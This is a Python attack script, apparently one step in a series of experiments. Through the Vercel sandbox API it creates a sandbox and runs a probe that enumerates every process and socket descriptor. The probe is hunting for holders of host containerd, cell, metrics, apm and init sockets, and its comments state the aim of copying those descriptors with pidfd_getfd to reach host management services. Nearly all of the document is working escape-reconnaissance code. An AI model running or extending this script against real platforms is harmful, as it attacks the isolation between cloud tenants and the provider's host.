# 实验K5: 沙箱 PID ns 全进程 fd 枚举 — 找 cell/metrics/apm/containerd socket 持有者
# 前置(j75): 共享 unix ns 内 containerd/cell/metrics/apm socket LISTEN 可见, 但文件系统不可达
# 目标: 找到持有进程 -> pidfd_getfd 复制 fd -> 直连宿主管理服务(containerd=容器运行时!)
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expk5"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os

TARGET_INODES = {"106": "metrics.sock", "108": "apm.sock", "117": "containerd.sock",
                 "1521": "containerd.sock.ttrpc", "1522": "containerd.sock",
                 "1526": "cell.sock(LISTEN)", "1614": "cell.sock", "1672": "init.sock",
                 "1705": "init.sock", "268": "init.sock"}

print("== [1] 全进程列表 ==", flush=True)
for pid in sorted(os.listdir("/proc"), key=lambda x: int(x) if x.isdigit() else 0):
    if not pid.isdigit():
        continue
    try:
        cmd = open(f"/proc/{pid}/cmdline", "rb").read().replace(b"\x00", b" ").decode(errors="replace")
        st = open(f"/proc/{pid}/stat", "rb").read().decode(errors="replace").split()
        comm = st[1] if len(st) > 1 else "?"
        print(f"  pid={pid} comm={comm} cmd={cmd[:100]}", flush=True)
    except Exception as e:
        pass

print("\n== [2] 全进程 fd 枚举 (socket inode) ==", flush=True)
hits = {}
for pid in sorted(os.listdir("/proc"), key=lambda x: int(x) if x.isdigit() else 0):
    if not pid.isdigit():
        continue
    try:
        for fd in os.listdir(f"/proc/{pid}/fd"):
            try:
                t = os.readlink(f"/proc/{pid}/fd/{fd}")
            except Exception:
                continue
            if "socket:[" in t:
                ino = t.split("[")[1].rstrip("]")
                name = TARGET_INODES.get(ino, "?")
                print(f"  pid={pid} fd={fd} -> {t} [{name}]", flush=True)
                hits.setdefault(ino, []).append((pid, fd))
    except Exception:
        pass

print("\n== [3] 目标 socket inode 持有者 ==", flush=True)
for ino, holders in hits.items():
    print(f"  inode {ino} ({TARGET_INODES.get(ino,'?')}): holders={holders}", flush=True)
if not hits:
    print("  NO HITS: 宿主 socket 持有进程不在沙箱 PID ns", flush=True)

print("\n== [4] /proc/net/unix 现况 ==", flush=True)
try:
    with open("/proc/net/unix") as f:
        lines = f.readlines()
    for ln in lines[1:]:
        parts = ln.split()
        if len(parts) >= 8 and parts[7]:
            ino = parts[6]
            mark = " <<<" if ino in TARGET_INODES else ""
            print(f"  ino={ino} {parts[7]}{mark}", flush=True)
except Exception as e:
    print("  ERR", e, flush=True)
"""
run_cmd(sid, PROBE, "fd-hunt", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
